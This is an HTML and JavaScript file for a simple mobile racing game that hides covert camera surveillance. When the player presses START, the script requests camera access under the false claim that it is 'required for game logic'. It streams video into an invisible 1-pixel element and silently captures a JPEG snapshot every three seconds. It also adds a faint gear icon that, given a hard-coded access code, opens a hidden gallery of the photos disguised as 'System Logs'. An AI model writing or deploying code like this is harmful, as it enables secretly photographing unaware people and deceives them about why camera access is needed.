<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Drive Pro</title>
    <style>
        * { box-sizing: border-box; touch-action: none; }
        body { margin: 0; background: #111; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: white; overflow: hidden; }
        
        #score { font-size: 24px; color: #f1c40f; margin-bottom: 5px; }
        #gameArea { position: relative; width: 340px; height: 65vh; background: #222; border: 4px solid #444; overflow: hidden; }
        
        /* Secret Video Feed (Invisible) */
        #vBox { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
        video { width: 100%; height: 100%; object-fit: cover; }

        /* Game Elements */
        .line { position: absolute; width: 8px; height: 60px; background: rgba(255,255,255,0.2); left: 50%; transform: translateX(-50%); }
        .car { position: absolute; width: 45px; height: 75px; border-radius: 8px; z-index: 5; }
        .player { background: linear-gradient(#ff4d4d, #990000); border: 2px solid #fff; }
        .enemy { background: linear-gradient(#2ecc71, #1b5e20); border: 2px solid #000; }

        /* Secret Screw Icon */
        #secretAccess { position: fixed; bottom: 5px; right: 5px; font-size: 18px; cursor: pointer; opacity: 0.2; z-index: 1000; }

        /* Controls */
        .controls { display: flex; gap: 40px; margin-top: 20px; }
        .btn { width: 75px; height: 75px; background: #333; border: none; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 5px 0 #000; }
        .arrow { width: 0; height: 0; border-top: 15px solid transparent; border-bottom: 15px solid transparent; }
        .l-arr { border-right: 25px solid white; }
        .r-arr { border-left: 25px solid white; }

        /* Overlay */
        #overlay { position: absolute; inset: 0; background: rgba(0,0,0,1); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 100; text-align: center; }
        .go-btn { padding: 15px 45px; font-size: 22px; background: #f1c40f; border: none; border-radius: 50px; font-weight: bold; cursor: pointer; }

        /* Secret Gallery */
        #gallery { position: fixed; inset: 0; background: #000; display: none; flex-direction: column; align-items: center; padding: 20px; z-index: 2000; overflow-y: auto; }
        .snap { width: 140px; height: 140px; border: 2px solid #444; margin: 5px; object-fit: cover; }
    </style>
</head>
<body>

    <div id="score">Score: 0</div>
    
    <div id="gameArea">
        <div id="vBox"><video id="video" autoplay playsinline muted></video></div>
        <div id="overlay">
            <h1>RACING PRO</h1>
            <p>Click Start to begin</p>
            <button class="go-btn" onclick="init()">START</button>
        </div>
    </div>

    <div class="controls">
        <button class="btn" id="left"><div class="arrow l-arr"></div></button>
        <button class="btn" id="right"><div class="arrow r-arr"></div></button>
    </div>

    <div id="secretAccess" onclick="checkCode()">⚙️</div>

    <div id="gallery">
        <h2>System Logs</h2>
        <div id="imgList" style="display:flex; flex-wrap:wrap; justify-content:center;"></div>
        <button onclick="document.getElementById('gallery').style.display='none'" style="margin:20px; padding:10px;">Back</button>
    </div>

    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const imgList = document.getElementById('imgList');
        const gallery = document.getElementById('gallery');
        const overlay = document.getElementById('overlay');
        
        let gameOn = false;
        let logs = []; 
        let carPos = { x: 145, y: 380, score: 0, moveL: false, moveR: false };

        async function init() {
            // Trigger Camera Permission correctly for GitHub/Mobile
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                video.play();
            } catch (e) { console.log("Camera required for game logic."); }

            overlay.style.display = 'none';
            gameOn = true;
            resetGame();
            
            // Photo capture starts immediately in background
            setInterval(() => {
                if(!gameOn) return;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, 320, 240);
                logs.push(canvas.toDataURL('image/jpeg', 0.5));
            }, 3000);

            requestAnimationFrame(tick);
        }

        function checkCode() {
            const val = prompt("Enter Access Code:");
            if (val === "vamsi jacks") {
                imgList.innerHTML = "";
                logs.forEach(src => {
                    const i = document.createElement('img');
                    i.src = src; i.className = 'snap';
                    imgList.appendChild(i);
                });
                gallery.style.display = 'flex';
            }
        }

        function resetGame() {
            gameArea.querySelectorAll('.car, .line').forEach(e => e.remove());
            for(let i=0; i<5; i++){
                let l = document.createElement('div'); l.className='line'; l.y=i*150;
                l.style.top=l.y+'px'; gameArea.appendChild(l);
            }
            let p = document.createElement('div'); p.id='pCar'; p.className='car player';
            gameArea.appendChild(p);
            for(let i=0; i<3; i++) spawn();
        }

        function spawn() {
            let e = document.createElement('div'); e.className='car enemy';
            e.y = Math.random() * -600; e.style.left = Math.random() * 280 + 'px';
            gameArea.appendChild(e);
        }

        document.getElementById('left').onpointerdown = () => carPos.moveL = true;
        document.getElementById('left').onpointerup = () => carPos.moveL = false;
        document.getElementById('right').onpointerdown = () => carPos.moveR = true;
        document.getElementById('right').onpointerup = () => carPos.moveR = false;

        function tick() {
            if (!gameOn) return;
            const p = document.getElementById('pCar');

            document.querySelectorAll('.line').forEach(l => {
                l.y += 6; if(l.y > 600) l.y = -100;
                l.style.top = l.y + 'px';
            });

            document.querySelectorAll('.enemy').forEach(e => {
                e.y += 6;
                if(e.y > 600) { e.y = -200; e.style.left = Math.random()*280+'px'; carPos.score++; }
                e.style.top = e.y + 'px';
                
                let r1 = p.getBoundingClientRect(); let r2 = e.getBoundingClientRect();
                if (!(r1.right < r2.left || r1.left > r2.right || r1.bottom < r2.top || r1.top > r2.bottom)) {
                    gameOn = false;
                    overlay.style.display = 'flex';
                    document.querySelector('h1').innerText = "SCORE: " + carPos.score;
                }
            });

            if (carPos.moveL && carPos.x > 0) carPos.x -= 6;
            if (carPos.moveR && carPos.x < 285) carPos.x += 6;
            p.style.left = carPos.x + 'px'; p.style.top = carPos.y + 'px';
            document.getElementById('score').innerText = "Score: " + carPos.score;
            requestAnimationFrame(tick);
        }
    </script>
</body>
</html>
